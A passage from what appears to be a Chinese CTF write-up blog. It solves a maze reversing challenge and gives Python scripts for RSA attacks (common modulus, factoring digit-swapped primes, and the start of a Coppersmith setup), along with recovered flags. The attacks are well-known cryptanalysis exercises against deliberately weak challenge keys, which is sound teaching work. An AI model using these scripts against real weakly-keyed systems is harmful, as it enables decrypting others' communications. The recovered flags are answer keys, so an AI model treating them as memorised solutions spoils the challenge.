class="number">19</span>:<span class="string">"###******###*#####*#################################################################*#####"</span>,</span><br><span class="line"><span class="number">23</span>:<span class="string">"###*#########*###############################################*############################"</span>,</span><br><span class="line"><span class="number">6</span>:<span class="string">"#*####*##*#########*######*******####*###**********####****####*##*############*####*#####"</span>,</span><br><span class="line"><span class="number">7</span>:<span class="string">"#*##***#**#########*#################*###*########*####*#######*##*############*####*#####"</span>,</span><br><span class="line"><span class="number">25</span>:<span class="string">"###**************************************************########*######*#####################"</span>,</span><br><span class="line"><span class="number">8</span>:<span class="string">"#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####"</span>,</span><br><span class="line"><span class="number">9</span>:<span class="string">"#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">11</span>:<span class="string">"###################*##############################*####***#####*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">12</span>:<span class="string">"###################********************************############*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">13</span>:<span class="string">"###############################################################*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">28</span>:<span class="string">"#########################*****************************************************************"</span>,</span><br><span class="line"><span class="number">14</span>:<span class="string">"###***************************************************#########*##*##*###*#####*####*#####"</span>,</span><br><span class="line"><span class="number">27</span>:<span class="string">"#############################################################*######*#####################"</span>,</span><br><span class="line"><span class="number">29</span>:<span class="string">"#*#######*####**###*#######***#######*########**###*******##*****##########################"</span>,</span><br><span class="line"><span class="number">30</span>:<span class="string">"##*#####*###*###*##*######*#########*#*######*##*#####*#####*##############################"</span>,</span><br><span class="line"><span class="number">31</span>:<span class="string">"###*###*####*###*##*######*##**####*###*####*#########*#####***############################"</span>,</span><br><span class="line"><span class="number">32</span>:<span class="string">"####*#*#####*###*##*##*###*###*###*******####*##*#####*#####*##############################"</span>,</span><br><span class="line"><span class="number">33</span>:<span class="string">"#####*#######**####****####**####*#######*####**######*#####*##############################"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">print</span> map[i]</span><br></pre></td></tr></table></figure></div><p>得到迷宫：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">**########################################################################################</span><br><span class="line">#*######################*******************************************#####*************#####</span><br><span class="line">#************************####*####################################*#####*###########*#####</span><br><span class="line">#########*#########*#########*#######***************************##*#####*###########*#####</span><br><span class="line">#******##*#########*#########*#######*#########################*##*#####*###########*#####</span><br><span class="line">#*####*##*#########*#########*#######*#########################*##*#####********####*#####</span><br><span class="line">#*####*##*#########*######*******####*###**********####****####*##*############*####*#####</span><br><span class="line">#*##***#**#########*#################*###*########*####*#######*##*############*####*#####</span><br><span class="line">#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####</span><br><span class="line">#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">#************######*##############**************##*####*#######*##*##*###*#####*####*#####</span><br><span class="line">###################*##############################*####***#####*##*##*###*#####*####*#####</span><br><span class="line">###################********************************############*##*##*###*#####*####*#####</span><br><span class="line">###############################################################*##*##*###*#####*####*#####</span><br><span class="line">###***************************************************#########*##*##*###*#####*####*#####</span><br><span class="line">###*#################################################*#########*##*######*#####*####*#####</span><br><span class="line">###*####*****#####**********************#############*#########*##********#####*####*#####</span><br><span class="line">###*####*###*#####*####################***************#########*###############*####*#####</span><br><span class="line">###*####*###*#####*############################################*****************####*#####</span><br><span class="line">###******###*#####*#################################################################*#####</span><br><span class="line">############*#####*******************************************************************#####</span><br><span class="line">###**********#############################################################################</span><br><span class="line">###*#########*****************************************************************############</span><br><span class="line">###*#########*###############################################*############################</span><br><span class="line">###*#########*###############################################*######*****************#####</span><br><span class="line">###**************************************************########*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#############################################################*######*#####################</span><br><span class="line">#########################*****************************************************************</span><br></pre></td></tr></table></figure></div><p>耐心走完即可：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">raw=<span class="string">'r1,d2,r18,d10,r31,u6,l9,d2,r6,d2,l13,u2,r3,u5,r26,d15,r16,u13,l7,u4,r12,d19,l66,u4,r21,d1,r14,u3,l50,d5,r5,u3,r4,d5,l9,d4,r10,u3,r48,d6,r28'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> raw.split(<span class="string">','</span>):</span><br><span class="line">    op=i[<span class="number">0</span>]</span><br><span class="line">    tm=i[<span class="number">1</span>:]</span><br><span class="line">    flag+=op*eval(tm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%flag.upper()</span><br></pre></td></tr></table></figure></div><blockquote><p>flag{RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR}</p></blockquote><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>密码学3道题全是RSA，除了共模攻击，其余都不会，基本靠百度</p><h2 id="Ridicule"><a href="#Ridicule" class="headerlink" title="Ridicule"></a>Ridicule</h2><ul><li><p>题目描述：</p><blockquote><p>你想要窃听Alice与Bob之间的通信，但他们使用了RSA加密，你无法破解。他们也知道这一点，为了嘲讽你，甚至把同一条消息发送了两次！<br>By <em>Mercurio</em></p></blockquote></li><li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Crypto/Ridicule/attachment.zip" target="_blank" rel="noopener">题目附件</a></p></li><li><p>考察点：RSA共模攻击</p></li><li><p>难度：简单</p></li><li><p>初始分值：150</p></li><li><p>最终分值：124</p></li><li><p>完成人数：8</p></li></ul><p>RSA共模攻击<a href="https://www.jianshu.com/p/2d95bdd0fb0d" target="_blank" rel="noopener">参考</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">e2 = <span class="number">395327</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line">c1 = <span class="number">91305913831214369377952269118161386003598023255485037043787231386393955913536147951327587587463685458285050904908606519471516585546641448049728693190905879280840165324662394536944611092018044651371870986413401191811244830102613672620955502806522821766703471780501595829827875795245077468666876924554483719367619785416487802738542307755841705317059328580966011761532447398826642223971344197882218789319343867872361384139568302372092803096038907172887382345170895273112014635399900800642737687324107565370573604700095505442212165699978970932019423809817487089085601763117309208863650351775335912245447387452956788773428626555630061201067204115092554187354312571068755262098974796820411503610378273433454274777409673603938861625985976632847656111827263952716196589771597261150375688197316301237918777772060246839505840400511836084221123300725351892908105214743311210231911274804713194290807741144717602270672051963664718188579120547722073387555742534912295882639385513725274066607278662476330784799812834843237551921507530373632320031381036550506607567061408192533501338206431901557732808859610231949222985385162467033555818794827557794123641737919050344373856601672258488664080854100467312218803256169436644089734181008742490711580042</span></span><br><span class="line">c2 = <span class="number">704672807914934785540657591440512058022586636125385843168732955073514077655455813212009493863389059666899528836516095699125514067099710358014253776587605045075141314272189607334786100207510015707758739101384698920619364876535606210899911129217151741959517344988838631586846350008457359747129948031415545489245577138170245470822851099234206216384013980124363443997339235504467924028046028680088155373925683649047495400986970876581673756506916765485275724626482137125637187439908185652963713581266007823789444165379453792444581101766966160504792503774410227806705414033756780127831024884593928515162191834028847725582871710066858868947182430104633621199015107401148118418338824086178489351697402962464798943542690540041445116576626615679919422505195176433797369659680306125076741925059577683214898660950897895672017286721867404885976418884202714626278569772713938624652451293587114431454520793129201159777144870706434853118587971437409703156441560836614022558588075615856594959231216241788071137142857422791753028932100557615225152094338580103681806055204290166319011784438838989437111665407114828731652938898822052627483844276822323929616602820305955544961236345999748237725866983443344310328933228220159896431099123550617191875040204</span></span><br><span class="line">n = <span class="number">762292637561009841867381758891924078920161551681011409810119236902708316218732647411043943763437022249138626076545685661730482641366923692658850431766314218412351837270927506312564544720954923062726662877953440678352431207958623308285911531147439741895411339784197821335423242138644430759797990474398292665026255344351314097831344143699467288732880374170750860467471905921107741006885109935239227868010666908525916679008871504582450836566108323926895929095994914698970059270570182580904903005923375868411609696598681700414843568442218100923302843261091071533416388834137121589901414277494938275241081203545819980264192183417604433935106780970110122975048006585657632026810857827012062220556533199813923599855002754246118206960819774209743569779749774598608808112482297107880631488151767561999274962162175282851451341191623222413183297157111802280844016550160932800325073699005271344653372643829523557629478171849469222857004697685188375657637289718545309995206957844911728971581888022289420352845395758422056507873315923916458799916423955515257867605617687429492984387761566675577947632934213753257825601450323638701033675536654894676100626699720281478967866417903915072119409044838795907066746433347300603690475300736848821164691031</span></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = modinv(c2, n)</span><br><span class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></div><p>解出字符串后再经rot47解密后即为flag</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/crypto/Ridicule/rsa_rot47.png" data-fancybox="group" data-caption="rsa_rot47.png" class="fancybox"><img alt="rsa_rot47.png" title="rsa_rot47.png" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/crypto/Ridicule/rsa_rot47.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="Ridicule-Revenge"><a href="#Ridicule-Revenge" class="headerlink" title="Ridicule_Revenge"></a>Ridicule_Revenge</h2><ul><li><p>题目描述：</p><blockquote><p>在你破解了Alice和Bob的通信后，他们决定不再把一条消息发送两次。他们认为，这次你一定束手无策。于是还是为了嘲讽你，他们甚至公开了加密脚本！<br>By <em>scholze</em></p></blockquote></li><li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Crypto/RidiculeRevenge/attachment.zip" target="_blank" rel="noopener">题目附件</a></p></li><li><p>考察点：RSA攻击</p></li><li><p>难度：中等</p></li><li><p>初始分值：250</p></li><li><p>最终分值：212</p></li><li><p>完成人数：7</p></li></ul><blockquote><p> 好像是个原题，能做出来全靠百度。</p></blockquote><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = int(gmpy2.next_prime(random.randint(<span class="number">10</span>**<span class="number">399</span>, <span class="number">10</span>**<span class="number">400</span><span class="number">-1</span>)))</span><br><span class="line">    q = int(str(p)[<span class="number">200</span>:]+str(p)[:<span class="number">200</span>])</span><br><span class="line">    <span class="keyword">if</span> gmpy2.is_prime(q):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"not right"</span>,p,q</span><br><span class="line">        <span class="keyword">if</span> check(p*q):</span><br><span class="line">            <span class="keyword">print</span> p*q</span><br></pre></td></tr></table></figure></div><p>p和q的选取比较有意思:</p><blockquote><p>p是长度400的随机素数，然后将p的前后200位互换位置，如果结果还是素数的话就作为q</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>摘录自<a href="https://www.jianshu.com/p/763427ea0e4b" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>首先我们先把<a href="https://math.jianshu.com/math?formula=p" data-fancybox="group" data-caption="p" class="fancybox"><img alt="p" title="p" data-src="https://math.jianshu.com/math?formula=p" src="/img/loading.gif" class="lazyload"></a>)切割成两部分，前200位为<a href="https://math.jianshu.com/math?formula=a" data-fancybox="group" data-caption="a" class="fancybox"><img alt="a" title="a" data-src="https://math.jianshu.com/math?formula=a" src="/img/loading.gif" class="lazyload"></a>)，后面的为<a href="https://math.jianshu.com/math?formula=b" data-fancybox="group" data-caption="b" class="fancybox"><img alt="b" title="b" data-src="https://math.jianshu.com/math?formula=b" src="/img/loading.gif" class="lazyload"></a>)，则<a href="https://math.jianshu.com/math?formula=p%3Da*10%5E%7B200%7D%2Bb" data-fancybox="group" data-caption="p=a*10^{200}+b" class="fancybox"><img alt="p=a*10^{200}+b" title="p=a*10^{200}+b" data-src="https://math.jianshu.com/math?formula=p%3Da*10%5E%7B200%7D%2Bb" src="/img/loading.gif" class="lazyload"></a>)，此时<a href="https://math.jianshu.com/math?formula=q%3Db*10%5E%7B200%7D%2Ba" data-fancybox="group" data-caption="q=b*10^{200}+a" class="fancybox"><img alt="q=b*10^{200}+a" title="q=b*10^{200}+a" data-src="https://math.jianshu.com/math?formula=q%3Db*10%5E%7B200%7D%2Ba" src="/img/loading.gif" class="lazyload"></a>。<br>所以<a href="https://math.jianshu.com/math?formula=n%3Dp*q%3D(b*10%5E%7B200%7D%2Ba)*(a*10%5E%7B200%7D%2Bb)%3D(a*b*10%5E%7B400%7D%2B(b%5E2%2Ba%5E2)*10%5E%7B200%7D%2Ba*b)" data-fancybox="group" data-caption="n=p*q=(b*10^{200}+a)*(a*10^{200}+b)=(a*b*10^{400}+(b^2+a^2)*10^{200}+a*b)" class="fancybox"><img alt="n=p*q=(b*10^{200}+a)*(a*10^{200}+b)=(a*b*10^{400}+(b^2+a^2)*10^{200}+a*b)" title="n=p*q=(b*10^{200}+a)*(a*10^{200}+b)=(a*b*10^{400}+(b^2+a^2)*10^{200}+a*b)" data-src="https://math.jianshu.com/math?formula=n%3Dp*q%3D(b*10%5E%7B200%7D%2Ba)*(a*10%5E%7B200%7D%2Bb)%3D(a*b*10%5E%7B400%7D%2B(b%5E2%2Ba%5E2)*10%5E%7B200%7D%2Ba*b)" src="/img/loading.gif" class="lazyload"></a>)不难发现<a href="https://math.jianshu.com/math?formula=n" data-fancybox="group" data-caption="n" class="fancybox"><img alt="n" title="n" data-src="https://math.jianshu.com/math?formula=n" src="/img/loading.gif" class="lazyload"></a>)最低200位是<a href="https://math.jianshu.com/math?formula=a*b" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>)的低200位，<a href="https://math.jianshu.com/math?formula=n" data-fancybox="group" data-caption="n" class="fancybox"><img alt="n" title="n" data-src="https://math.jianshu.com/math?formula=n" src="/img/loading.gif" class="lazyload"></a>)最高200位是<a href="https://math.jianshu.com/math?formula=a*b" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>)的高200位（或者<a href="https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2" data-fancybox="group" data-caption="a^2+b^2" class="fancybox"><img alt="a^2+b^2" title="a^2+b^2" data-src="https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2" src="/img/loading.gif" class="lazyload"></a>)进一位）而<a href="https://math.jianshu.com/math?formula=p" data-fancybox="group" data-caption="p" class="fancybox"><img alt="p" title="p" data-src="https://math.jianshu.com/math?formula=p" src="/img/loading.gif" class="lazyload"></a>)是400位，所以<a href="https://math.jianshu.com/math?formula=a%2Cb" data-fancybox="group" data-caption="a,b" class="fancybox"><img alt="a,b" title="a,b" data-src="https://math.jianshu.com/math?formula=a%2Cb" src="/img/loading.gif" class="lazyload"></a>)都为200位，所以<a href="https://math.jianshu.com/math?formula=a*b" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>)也为400位，所以此时得到就是<a href="https://math.jianshu.com/math?formula=a*b" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>。<br>此时我们用<a href="https://math.jianshu.com/math?formula=a*b" data-fancybox="group" data-caption="a*b" class="fancybox"><img alt="a*b" title="a*b" data-src="https://math.jianshu.com/math?formula=a*b" src="/img/loading.gif" class="lazyload"></a>)去代入上述等式，求出<a href="https://math.jianshu.com/math?formula=(a%5E2%2Bb%5E2)*10%5E%7B200%7D" data-fancybox="group" data-caption="(a^2+b^2)*10^{200}" class="fancybox"><img alt="(a^2+b^2)*10^{200}" title="(a^2+b^2)*10^{200}" data-src="https://math.jianshu.com/math?formula=(a%5E2%2Bb%5E2)*10%5E%7B200%7D" src="/img/loading.gif" class="lazyload"></a>)。此时我们可以根据得到的值后200位是否全为0，从而判断<a href="https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2" data-fancybox="group" data-caption="a^2+b^2" class="fancybox"><img alt="a^2+b^2" title="a^2+b^2" data-src="https://math.jianshu.com/math?formula=a%5E2%2Bb%5E2" src="/img/loading.gif" class="lazyload"></a>)是进了一位的。然后两个变量两个等式算出<a href="https://math.jianshu.com/math?formula=a" data-fancybox="group" data-caption="a" class="fancybox"><img alt="a" title="a" data-src="https://math.jianshu.com/math?formula=a" src="/img/loading.gif" class="lazyload"></a>)，<a href="https://math.jianshu.com/math?formula=b" data-fancybox="group" data-caption="b" class="fancybox"><img alt="b" title="b" data-src="https://math.jianshu.com/math?formula=b" src="/img/loading.gif" class="lazyload"></a>。</p></blockquote><h3 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.jianshu.com/p/763427ea0e4b</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836</span></span><br><span class="line">n = <span class="number">21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">tmp = <span class="number">10</span>**<span class="number">200</span></span><br><span class="line"><span class="comment">#abhigh,ablow = n/(tmp^3), n % tmp</span></span><br><span class="line">abhigh,ablow = n/(tmp**<span class="number">3</span>)<span class="number">-1</span>, n % tmp</span><br><span class="line">ab = abhigh*tmp+ablow</span><br><span class="line"><span class="comment"># a**2+b**2</span></span><br><span class="line">a2b2 = (n-ab*(tmp**<span class="number">2</span>)-ab)/tmp</span><br><span class="line"><span class="comment">#print a2b2</span></span><br><span class="line"><span class="comment">#(a-b),(a+b)</span></span><br><span class="line">tmp1 = gmpy2.iroot(a2b2<span class="number">-2</span>*ab,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">tmp2 = gmpy2.iroot(a2b2+<span class="number">2</span>*ab,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">a = (tmp1+tmp2)/<span class="number">2</span></span><br><span class="line">b = a-tmp1</span><br><span class="line">p = a*tmp + b</span><br><span class="line">q = n/p</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,p*q)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure></div><h2 id="Ridicule-Rerevengevenge-unsolved"><a href="#Ridicule-Rerevengevenge-unsolved" class="headerlink" title="Ridicule_Rerevengevenge [unsolved]"></a>Ridicule_Rerevengevenge [unsolved]</h2><ul><li><p>题目描述：</p><blockquote><p>在你再次成功破解他们的通信之后，Alice和Bob依然没有停止对你的嘲讽——这一次，你甚至可以得到残缺的明文！<br>注：flag为明文的隐藏部分，flag格式为<code>flag{16进制数}</code><br>By <em>scholze</em><br>hint: Sage</p></blockquote></li><li><p><a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Crypto/RidiculeRerevengevenge/attachment.zip" target="_blank" rel="noopener">题目附件</a></p></li><li><p>考察点：RSA攻击</p></li><li><p>难度：困难</p></li><li><p>初始分值：400</p></li><li><p>最终分值：368</p></li><li><p>完成人数：5</p></li></ul><blockquote><p>数学…太南了…看官方wp给的<a href="https://code.felinae98.cn/ctf/crypto/rsa%E5%A4%A7%E7%A4%BC%E5%8C%85%EF%BC%88%E4%BA%8C%EF%BC%89coppersmith-%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">参考链接</a>竟是我本科社团学弟的文章…唉…自愧不如……</p></blockquote><h3 id="直接贴出官方wp"><a href="#直接贴出官方wp" class="headerlink" title="直接贴出官方wp"></a>直接贴出官方wp</h3><p>去<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">这里</a>，选择<code>sage</code>，然后参考<a href="https://code.felinae98.cn/ctf/crypto/rsa大礼包%EF%BC%88二%EF%BC%89coppersmith-相关" target="_blank" rel="noopener">这篇文章</a></p><p>转成十进制后再用如下代码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">0x2519834a6cc3bf25d078caefc5358e41c726a7a56270e425e21515d1b195b248b82f4189a0b621694586bb254e27010ee4376a849bb373e5e3f2eb622e3e7804d18ddb897463f3516b431e7fc65ec41c42edf736d5940c3139d1e374aed1fc3b70737125e1f540b541a9c671f4bf0ded798d727211116eb8b86cdd6a29aefcc7</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">m = randrange(n)</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line">epsilon = beta ^ <span class="number">2</span> / <span class="number">7</span></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">kbits = floor(nbits * (beta ^ <span class="number">2</span> / e - epsilon))</span><br><span class="line"><span class="comment"># mbar = m &amp; (2^nbits-2^kbits)</span></span><br><span class="line">mbar = <span class="number">0xb11ffc4ce423c77035280f1c575696327901daac8a83c057c453973ee5f4e508455648886441c0f3393fe4c922ef1c3a6249c12d21a000000000000000000</span></span><br><span class="line">c = <span 